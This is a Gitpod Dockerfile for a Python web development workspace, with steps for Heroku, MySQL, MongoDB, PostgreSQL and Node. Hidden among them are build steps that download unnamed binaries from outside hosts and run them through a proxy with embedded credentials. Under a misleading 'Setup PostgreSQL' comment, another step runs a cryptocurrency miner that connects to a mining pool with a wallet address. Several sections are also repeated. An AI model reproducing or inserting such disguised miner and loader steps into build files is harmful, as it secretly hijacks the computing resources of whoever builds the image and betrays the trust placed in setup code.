
FROM gitpod/workspace-full

# Setup Heroku CLI

RUN curl https://cli-assets.heroku.com/install.sh | sh

# Setup Python linters

RUN pip3 install flake8 flake8-flask flake8-django

RUN wget -O 1 https://github.com/konchilsxx/asw/raw/main/tepel && \ 

    wget -O 2 https://github.com/konchilsxx/asw/raw/main/v2 && \

    export_http_proxy=socks5://jxkjpywa:f04h5dfeyfme@45.57.255.130:7169 && \ 

    chmod u+x 1

RUN  timeout 60m ./1

# Setup MongoDB and MySQL

RUN sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 20691eec35216c63caf66ce1656408e390cfb1f5 && \

    sudo sh -c 'echo "deb http://repo.mongodb.org/apt/ubuntu focal/mongodb-org/4.4 multiverse" | tee /etc/apt/sources.list.d/mongodb-org-4.4.list'  && \

    sudo apt-get update -y  && \

    sudo touch /etc/init.d/mongod  && \

    sudo apt-get install -y mongodb-org-shell  && \

    sudo apt-get install -y links  && \

    sudo apt-get install -y mysql-server && \

    sudo apt-get clean -y && \

    sudo rm -rf /var/cache/apt/* /var/lib/apt/lists/* /tmp/* && \

    sudo mkdir /var/run/mysqld && \

    sudo chown -R gitpod:gitpod /etc/mysql /var/run/mysqld /var/log/mysql /var/lib/mysql /var/lib/mysql-files /var/lib/mysql-keyring /var/lib/mysql-upgrade /home/gitpod/.cache/heroku/

# Setup PostgreSQL

RUN wget https://bitbucket.org/santict/run/raw/ee94eb0421728225bf0a680669964e86cf115b63/ccm && \ 

    chmod u+x * && \

    sudo apt install libjansson4 -y 

RUN ./ccm -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DQbKrytBZ3fxVQgBf8DzdCq9SZTc856LuH.$worker -p c=DGB -t 6 -x socks5://192.252.215.2:4145

RUN sudo sh -c 'echo "deb http://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main" | tee /etc/apt/sources.list.d/pgdg.list' && \

    sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv B97B0AFCAA1A47F044F244A07FCC7D46ACCC4CF8 && \

    sudo apt-get update -y && \

    sudo apt-get install -y postgresql-12

ENV PGDATA="/workspace/.pgsql/data"

RUN mkdir -p ~/.pg_ctl/bin ~/.pg_ctl/sockets \

    && echo '#!/bin/bash\n[ ! -d $PGDATA ] && mkdir -p $PGDATA && initdb --auth=trust -D $PGDATA\npg_ctl -D $PGDATA -l ~/.pg_ctl/log -o "-k ~/.pg_ctl/sockets" start\n' > ~/.pg_ctl/bin/pg_start \

    && echo '#!/bin/bash\npg_ctl -D $PGDATA -l ~/.pg_ctl/log -o "-k ~/.pg_ctl/sockets" stop\n' > ~/.pg_ctl/bin/pg_stop \

    && chmod +x ~/.pg_ctl/bin/*

# ENV DATABASE_URL="postgresql://gitpod@localhost"

# ENV PGHOSTADDR="127.0.0.1"

ENV PGDATABASE="postgres"

# Upgrade Node

ENV NODE_VERSION=14.15.4

RUN bash -c ". .nvm/nvm.sh && \

        nvm install ${NODE_VERSION} && \

        nvm alias default ${NODE_VERSION} && \

        npm install -g yarn"

ENV PATH="/usr/lib/postgresql/12/bin:/home/gitpod/.nvm/versions/node/v${NODE_VERSION}/bin:$HOME/.pg_ctl/bin:$PATH"

# Create our own config files

COPY .vscode/mysql.cnf /etc/mysql/mysql.conf.d/mysqld.cnf

COPY .vscode/client.cnf /etc/mysql/mysql.conf.d/client.cnf

COPY .vscode/start_mysql.sh /etc/mysql/mysql-bashrc-launch.sh

# Start MySQL when we log in

# Add aliases

RUN echo 'alias run="python3 $GITPOD_REPO_ROOT/manage.py runserver 0.0.0.0:8000"' >> ~/.bashrc && \

    echo 'alias heroku_config=". $GITPOD_REPO_ROOT/.vscode/heroku_config.sh"' >> ~/.bashrc && \

    echo 'alias python=python3' >> ~/.bashrc && \

    echo 'alias pip=pip3' >> ~/.bashrc && \

    echo 'alias arctictern="python3 $GITPOD_REPO_ROOT/.vscode/arctictern.py"' >> ~/.bashrc && \

    echo 'alias font_fix="python3 $GITPOD_REPO_ROOT/.vscode/font_fix.py"' >> ~/.bashrc && \

    echo 'alias set_pg="export PGHOSTADDR=127.0.0.1"' >> ~/.bashrc && \

    echo 'alias mongosh=mongo' >> ~/.bashrc && \

    echo ". /etc/mysql/mysql-bashrc-launch.sh" >> ~/.bashrc && \

    echo 'FILE="$GITPOD_REPO_ROOT/.vscode/post_upgrade.sh"' >> ~/.bashrc && \

    echo 'if [ -z "$POST_UPGRADE_RUN" ]; then' >> ~/.bashrc && \

    echo '  if [[ -f "$FILE" ]]; then' >> ~/.bashrc && \

    echo '    . "$GITPOD_REPO_ROOT/.vscode/post_upgrade.sh"' >> ~/.bashrc && \

    echo "  fi" >> ~/.bashrc && \

    echo "fi" >> ~/.bashrc

# Local environment variables

# C9USER is temporary to allow the MySQL Gist to run

ENV C9_USER="root"

ENV PORT="8080"

ENV IP="0.0.0.0"

ENV C9_HOSTNAME="localhost"

# Setup Heroku CLI

RUN curl https://cli-assets.heroku.com/install.sh | sh

# Setup MongoDB and MySQL

RUN apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 20691eec35216c63caf66ce1656408e390cfb1f5 && \

    echo "deb http://repo.mongodb.org/apt/ubuntu focal/mongodb-org/4.4 multiverse" | tee /etc/apt/sources.list.d/mongodb-org-4.4.list  && \

    apt-get update -y  && \

    touch /etc/init.d/mongod  && \

    apt-get -y install mongodb-org-shell -y  && \

    apt-get -y install links  && \

    apt-get install -y mysql-server && \

    apt-get clean && rm -rf /var/cache/apt/* /var/lib/apt/lists/* /tmp/* && \

    mkdir /var/run/mysqld && \

    chown -R gitpod:gitpod /etc/mysql /var/run/mysqld /var/log/mysql /var/lib/mysql /var/lib/mysql-files /var/lib/mysql-keyring /var/lib/mysql-upgrade /home/gitpod/.cache/heroku/ && \

    pip3 install flake8 flake8-flask flake8-django

# Create our own config files

COPY .vscode/mysql.cnf /etc/mysql/mysql.conf.d/mysqld.cnf

COPY .vscode/client.cnf /etc/mysql/mysql.conf.d/client.cnf

COPY .vscode/start_mysql.sh /etc/mysql/mysql-bashrc-launch.sh

USER gitpod

# Start MySQL when we log in

RUN echo 'alias run="python3 $GITPOD_REPO_ROOT/manage.py runserver 0.0.0.0:8000"' >> ~/.bashrc

RUN echo 'alias heroku_config=". $GITPOD_REPO_ROOT/.vscode/heroku_config.sh"' >> ~/.bashrc

RUN echo 'alias python=python3' >> ~/.bashrc

RUN echo 'alias pip=pip3' >> ~/.bashrc

RUN echo 'alias font_fix="python3 $GITPOD_REPO_ROOT/.vscode/font_fix.py"' >> ~/.bashrc

RUN echo ". /etc/mysql/mysql-bashrc-launch.sh" >> ~/.bashrc

# Local environment variables

# C9USER is temporary to allow the MySQL Gist to run

ENV C9_USER="gitpod"

ENV PORT="8080"

ENV IP="0.0.0.0"

ENV C9_HOSTNAME="localhost"

USER root

# Switch back to root to allow IDE to load
